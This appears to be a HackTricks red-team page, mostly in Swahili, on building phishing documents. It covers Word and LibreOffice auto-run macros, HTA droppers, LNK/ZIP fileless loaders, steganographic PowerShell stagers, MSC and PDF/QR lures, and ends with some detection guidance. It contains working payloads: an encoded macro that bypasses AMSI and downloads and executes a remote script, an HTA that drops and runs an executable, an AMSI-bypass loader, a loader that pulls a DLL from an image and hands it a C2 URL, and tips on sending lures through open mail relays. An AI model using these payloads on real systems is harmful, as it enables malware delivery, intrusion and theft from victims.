# Files & Documents za Phishing

{{#include ../../banners/hacktricks-training.md}}

## Office Documents

Microsoft Word hufanya uthibitishaji wa data ya faili kabla ya kufungua faili. Uthibitishaji wa data hufanywa kwa njia ya kutambua muundo wa data, kwa kuulinganisha na kiwango cha OfficeOpenXML. Ikiwa hitilafu yoyote itatokea wakati wa kutambua muundo wa data, faili inayochanganuliwa haitafunguliwa.

Kwa kawaida, Word files zilizo na macros hutumia extension ya `.docm`. Hata hivyo, inawezekana kubadilisha jina la faili kwa kubadilisha file extension na bado kuhifadhi uwezo wake wa kutekeleza macro.\
Kwa mfano, RTF file haiungi mkono macros, kwa muundo wake, lakini DOCM file iliyobadilishwa jina kuwa RTF itashughulikiwa na Microsoft Word na itaweza kutekeleza macro.\
Internals na mechanisms zilezile hutumika katika software zote za Microsoft Office Suite (Excel, PowerPoint, n.k.).

Unaweza kutumia command ifuatayo kuangalia ni extensions zipi zitatekelezwa na baadhi ya Office programs:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX files zinazorejelea template ya remote (File –Options –Add-ins –Manage: Templates –Go) iliyo na macros zinaweza pia “kutekeleza” macros.

### External Image Load

Nenda kwenye: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, na **Filename or URL**:_ http://<ip>/whatever

![Office Documents - External Image Load: Nenda kwenye: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Macros Backdoor

Inawezekana kutumia macros kuendesha arbitrary code kutoka kwenye document.

#### Autoload functions

Kadiri zinavyokuwa common, ndivyo uwezekano wa AV kuzitambua unavyoongezeka.

- AutoOpen()
- Document_Open()

#### Mifano ya Macros Code
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Ondoa metadata kwa mkono

Nenda kwenye **File > Info > Inspect Document > Inspect Document**, jambo ambalo litafungua Document Inspector. Bofya **Inspect** kisha **Remove All** karibu na **Document Properties and Personal Information**.

#### Doc Extension

Baada ya kumaliza, chagua menyu kunjuzi ya **Save as type**, badilisha format kutoka **`.docx`** hadi **Word 97-2003 `.doc`**.\
Fanya hivi kwa sababu **huwezi kuhifadhi macro ndani ya `.docx`** na kuna **stigma** **kuhusu** extension ya **`.docm`** inayowezesha macro (kwa mfano, thumbnail icon ina `!` kubwa na baadhi ya web/email gateway huzizuia kabisa). Kwa hiyo, **extension hii ya legacy `.doc` ndiyo suluhisho bora la kati**.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT auto-run macros (Basic)

LibreOffice Writer documents zinaweza kupachika Basic macros na kuziendesha kiotomatiki wakati file inafunguliwa kwa kuunganisha macro kwenye tukio la **Open Document** (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Macro rahisi ya reverse shell inaonekana hivi:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Kumbuka alama za nukuu zilizorudiwa (`""`) ndani ya string – LibreOffice Basic huzitumia kutoroka alama za nukuu halisi, kwa hivyo payload zinazoishia na `...==""")` hudumisha usawazishaji wa command ya ndani na argument ya Shell.

Vidokezo vya uwasilishaji:

- Hifadhi kama `.odt` na funga macro kwenye tukio la document ili ianze mara moja inapofunguliwa.
- Unapotuma barua pepe kwa `swaks`, tumia `--attach @resume.odt` (`@` inahitajika ili bytes za faili, si string ya jina la faili, zitumwe kama attachment). Hili ni muhimu wakati wa kutumia vibaya SMTP servers zinazokubali recipients za kiholela za `RCPT TO` bila validation.

## HTA Files

HTA ni programu ya Windows inayochanganya **HTML na lugha za scripting (kama VBScript na JScript)**. Huunda user interface na kutekelezwa kama application yenye "fully trusted", bila vikwazo vya security model ya browser.

HTA hutekelezwa kwa kutumia **`mshta.exe`**, ambayo kwa kawaida **huwekwa** pamoja na **Internet Explorer**, hivyo **`mshta` inategemea IE**. Kwa hiyo, ikiwa imeondolewa, HTA hazitaweza kutekelezwa.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Kulazimisha NTLM Authentication

Kuna njia kadhaa za **kulazimisha NTLM authentication "remotely"**, kwa mfano, unaweza kuongeza **invisible images** kwenye barua pepe au HTML ambayo mtumiaji ataifikia (hata HTTP MitM?). Au kumtumia victim **address ya files** ambazo **zitasababisha** **authentication** kwa **kufungua tu folder.**

**Angalia mawazo haya na mengine katika kurasa zifuatazo:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Usisahau kwamba huwezi tu kuiba hash au authentication, bali pia **kufanya NTLM relay attacks**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Campaigns zenye ufanisi mkubwa hutoa ZIP iliyo na documents mbili halali za decoy (PDF/DOCX) na malicious .lnk. Ujanja ni kwamba PowerShell loader halisi huhifadhiwa ndani ya raw bytes za ZIP baada ya marker ya kipekee, na .lnk huikata na kuiendesha kikamilifu kwenye memory.<sup>[[2]](#references)</sup>

Mtiririko wa kawaida unaotekelezwa na PowerShell one-liner ya .lnk:

1) Tafuta ZIP asili katika paths za kawaida: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, na parent wa current working directory.
2) Soma ZIP bytes na utafute marker iliyowekwa hardcode (kwa mfano, xFIQCV). Kila kitu baada ya marker hiyo ndicho embedded PowerShell payload.
3) Copy ZIP hadi %ProgramData%, extract humo, na ufungue decoy .docx ili ionekane halali.
4) Bypass AMSI kwa current process: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Deobfuscate next stage (kwa mfano, ondoa characters zote za #) na ui-execute kwenye memory.

Mfano wa PowerShell skeleton wa kukata na kuendesha embedded stage:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Maelezo
- Delivery mara nyingi hutumia vibaya PaaS subdomains zinazoaminika (k.m., *.herokuapp.com) na inaweza kuweka payloads nyuma ya masharti (kuhudumia ZIPs zisizo na madhara kulingana na IP/UA).
- Hatua inayofuata mara nyingi hudecrypt base64/XOR shellcode na kui-execute kupitia Reflection.Emit + VirtualAlloc ili kupunguza disk artifacts.

Persistence iliyotumika katika chain hiyo hiyo
- COM TypeLib hijacking ya Microsoft Web Browser control, ili IE/Explorer au app yoyote inayoi-embed i-re-launch payload automatically.<sup>[[2]](#references)[[4]](#references)</sup> Tazama maelezo na commands zilizo tayari kutumika hapa:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Utafutaji/IOCs
- ZIP files zilizo na ASCII marker string (k.m., xFIQCV) iliyoongezwa mwishoni mwa archive data.
- .lnk inayoorodhesha parent/user folders ili kutafuta ZIP na kufungua decoy document.
- AMSI tampering kupitia [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Business threads zinazoendelea kwa muda mrefu na kumalizika kwa links zinazohostiwa chini ya trusted PaaS domains.

## LNK decoy-first staging → scheduled-task persistence → trusted CPL side-loading

Pattern nyingine inayojirudia ni **.lnk inayoiga document** ambayo hufungua mara moja benign lure huku iki-stage chain halisi kwa background.<sup>[[3]](#references)</sup>

Observed workflow:
1. Shortcut **hujifanya kuwa PDF** na hutumia `conhost.exe` au proxy inayofanana ku-spawn obfuscated PowerShell downloader.
2. PowerShell hugawanya tokens zilizo wazi (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) ili naive detections zinazotafuta `iwr`, `gci`, `ren`, `cpi`, au `schtasks` zikose command.
3. Stager hudownload **decoy document kwanza**, huifungua kwa victim, kisha huunda upya malicious files kwa background.
4. Payloads zinaweza kuandikwa zikiwa na **junk extensions**, kisha kubadilishwa majina kwa kuondoa filler characters, hivyo kuchelewesha kuonekana kwa `.exe` / `.cpl` artifacts zilizo wazi.
5. Persistence huwekwa kwa **scheduled task inayotegemea dakika**, ambayo huzindua trusted host binary kutoka user-writable path.

Minimal hunting clues kutoka kwenye pattern hii:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
Muundo muhimu wa staging wa kutambua ni:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` au `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Kwa nini second stage ni stealthy

Katika case study ya Rapid7, scheduled task ilizindua **`Fondue.exe`** mara kwa mara kutoka `C:\Users\Public\`. Kwa sababu **`APPWIZ.cpl`** iliwekwa pamoja nayo na ikatoa **`RunFODW`**, binary ya Microsoft inayoaminika ili-side-load CPL ya attacker badala ya system copy halali.

CPL kisha:
- Husoma blob ya **AES-256-CBC** kutoka `C:\Windows\Tasks\editor.dat`
- Hui-decrypt kupitia **Windows CNG / `bcrypt.dll`**
- Hutenga executable memory na kunakili shellcode iliyodecryptiwa
- Hui-execute kwa njia isiyo ya moja kwa moja kwa kupitisha pointer ya shellcode kama callback ya **`EnumUILanguagesW`**

Hatua hii ya mwisho inafaa kutafutwa kando: malware mara nyingi huepuka jump ya moja kwa moja ya `((void(*)())buf)()` na badala yake hutumia vibaya **legitimate callback-taking WinAPI** kuhamisha execution.

Payload iliyodecryptiwa katika campaign hii ilikuwa **Donut** shellcode, ambayo kisha ili-map final PE kikamilifu ndani ya memory na kupatch **AMSI/WLDP/ETW** katika current process kabla ya kuhamisha execution. Kwa maelezo zaidi kuhusu side-loading na memory-resident post-processing, tazama:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Practical hunting pivots:
- `.lnk` inayozindua `powershell.exe` au `conhost.exe`, ikifuatiwa na decoy document inayoonekana.
- Downloads za muda mfupi kwenda **`C:\Users\Public\`**, zikifuatiwa na renames za mara moja kutoka kwenye extensions zisizo na maana.
- Scheduled tasks zenye majina yasiyo na mashaka kama `GoogleErrorReport`, zinazo-execute kutoka **user-writable directories**.
- Trusted binaries zinazopakia faili za **`.cpl` / `.dll`** kutoka kwenye directory ileile isiyo ya system.
- Base64 text blobs zinazoandikwa chini ya **`C:\Windows\Tasks\`** na kisha kusomwa na side-loaded module.

## Steganography-delimited payloads katika images (PowerShell stager)

Loader chains za hivi karibuni huwasilisha JavaScript/VBS iliyofichwa ambayo hu-decode na ku-run Base64 PowerShell stager. Stager hiyo hudownload image (mara nyingi GIF) iliyo na .NET DLL iliyosimbwa kwa Base64 na kufichwa kama plain text kati ya unique start/end markers. Script hutafuta delimiters hizi (mifano iliyoonekana in the wild: «<<sudo_png>> … <<sudo_odt>>>»), hutoa between-text, hui-Base64-decode kuwa bytes, hupakia assembly hiyo in-memory na kuita entry method inayojulikana pamoja na C2 URL.<sup>[[5]](#references)</sup>

Workflow
- Stage 1: Archived JS/VBS dropper → hu-decode embedded Base64 → huzindua PowerShell stager kwa -nop -w hidden -ep bypass.
- Stage 2: PowerShell stager → hudownload image, huchopoa Base64 iliyotenganishwa na markers, hupakia .NET DLL in-memory na kuita method yake (kwa mfano, VAI) ikipitisha C2 URL na options.
- Stage 3: Loader hupata final payload na kwa kawaida hui-inject kupitia process hollowing ndani ya trusted binary (mara nyingi MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Soma zaidi kuhusu process hollowing na trusted utility proxy execution hapa:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Mfano wa PowerShell wa kuchopoa DLL kutoka kwenye image na kuita .NET method in-memory:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Maelezo
- Hii ni ATT&CK T1027.003 (steganography/marker-hiding).<sup>[[6]](#references)</sup> Markers hutofautiana kati ya campaigns.
- AMSI/ETW bypass na string deobfuscation hutumiwa kwa kawaida kabla ya kupakia assembly.
- Hunting: scan picha zilizopakuliwa kwa delimiters zinazojulikana; tambua PowerShell inayofikia picha na mara moja decoding Base64 blobs.

Tazama pia stego tools na carving techniques:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Initial stage inayojirudia ni `.js` au `.vbs` ndogo yenye obfuscation kubwa, inayowasilishwa ndani ya archive. Madhumuni yake pekee ni ku-decode string ya Base64 iliyopachikwa na kuzindua PowerShell yenye `-nop -w hidden -ep bypass` ili bootstrap next stage kupitia HTTPS.<sup>[[5]](#references)</sup>

Skeleton logic (abstract):
- Soma yaliyomo kwenye faili lenyewe
- Tafuta Base64 blob kati ya junk strings
- Decode kuwa ASCII PowerShell
- Execute kwa `wscript.exe`/`cscript.exe` ikizindua `powershell.exe`

Hunting cues
- Attachments za JS/VBS zilizo kwenye archive zinazozindua `powershell.exe` yenye `-enc`/`FromBase64String` kwenye command line.
- `wscript.exe` inayozindua `powershell.exe -nop -w hidden` kutoka user temp paths.

## MSC documents as execution containers (GrimResource)

Microsoft Management Console files (`.msc`) ni XML console definitions ambazo kwa kawaida hufunguliwa na `mmc.exe`. **GrimResource** hutumia weaponize reference ya `StringTable` kuelekea resource ya `apds.dll` iliyo na XSS primitive ya zamani, hivyo mtumiaji anapofungua console iliyoundwa mahsusi, JavaScript huendeshwa ndani ya `mmc.exe`. Samples zilizochunguzwa ziliunganisha obfuscation inayotegemea `transformNode` na **DotNetToJScript** ili kuanzisha .NET payload bila kutumia njia ya kawaida ya Office-macro.<sup>[[9]](#references)</sup>

Kwa static triage, ichukulie MSC isiyoaminika kama text na **usiibofye mara mbili**:<sup>[[9]](#references)</sup>
```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```
Mabadiliko ya runtime yenye ishara kubwa ni `mmc.exe` kupakia CLR au script components, kuunda miunganisho ya mtandao, au kuzindua `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe`, au executable isiyotarajiwa. Muundo huo ni halali, hivyo detections zinapaswa kuhusisha **asili + maudhui ya XML/script yanayotia shaka + tabia ya `mmc.exe`** badala ya kuzuia kila MSC.<sup>[[9]](#references)</sup>

## Waelekezaji wa PDF/QR na udhibiti wa payload

PDF haihitaji exploit ili iwe na manufaa. Campaign za hivi karibuni huweka **QR code au link ya kawaida** katika document inayoonekana kuwa salama, huielekeza browser session mbali na vidhibiti vya barua pepe, na kubinafsisha destination kwa kutumia anwani ya mpokeaji. Microsoft iliandika kuhusu PDF za 2025 ambazo QR URLs zake zilikuwa za kipekee kwa kila mpokeaji na zilielekeza kwenye RaccoonO365 credential-harvesting infrastructure; chain sambamba ilitumia IP/environment gating kurudisha JavaScript/MSI path kwa visitors waliochaguliwa, lakini PDF salama kwa scanners au clients wasioruhusiwa.<sup>[[10]](#references)</sup>

Fanya triage ya PDF actions na QR codes zilizorenderiwa. QR inaweza kuchorwa kama vector badala ya kuhifadhiwa kama image inayoweza kutolewa, hivyo rasterize kila page pamoja na kutoa embedded images:
```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```
Kagua destinations zilizodecode na redirects kutoka kwenye mfumo wa uchanganuzi uliotengwa bila ku-authenticate. Vipengele muhimu vya hunting vinajumuisha PDFs za QR pekee zenye mail bodies zilizo karibu kuwa tupu, recipient email iliyowekwa ndani ya query parameter, redirects kadhaa kupitia hosting inayoheshimika, na content tofauti inayorejeshwa kulingana na IP, geolocation, cookies, referrer, au user agent. Linganisha requests kwa kutumia profiles zinazodhibitiwa kwa sababu sandbox fetch moja inaweza kupokea decoy pekee.<sup>[[10]](#references)</sup>

## Windows files za kuiba NTLM hashes

Angalia ukurasa kuhusu **sehemu za kuiba NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – Kampeni ya ZipLine: Phishing attack ya hali ya juu inayolenga makampuni ya Marekani](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: Kufuatilia tradecraft ya Dropping Elephant kupitia China-Themed Loader Chain](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – COM persistence technique mpya (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader inasambaza Infostealers mbalimbali](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: Microsoft Management Console kwa initial access na evasion](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Threat actors wanatumia msimu wa kodi kuendesha tax-themed phishing campaigns](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
{{#include ../../banners/hacktricks-training.md}}
